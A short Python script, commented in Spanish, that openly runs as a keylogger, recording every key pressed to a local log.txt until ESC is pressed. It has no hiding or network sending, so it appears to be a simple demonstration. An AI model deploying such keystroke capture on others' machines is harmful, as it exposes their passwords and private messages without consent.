import keyboard


LOG_FILE = "log.txt"

def on_press(event):
    """
    Función que se ejecuta cada vez que se presiona una tecla.
    Registra el nombre de la tecla en el archivo log.
    """
    with open(LOG_FILE, "a") as f:

        f.write(f"{event.name}\n")

def main():
    print(f"Iniciando keylogger")
    print(f"Se guardarán en: {LOG_FILE}")
    print("Presiona la tecla ESC para detener el proceso.")

    keyboard.on_press(on_press)

    keyboard.wait('esc')
    print("\nPrograma detenido. Registro finalizado.")

if __name__ == "__main__":
    main()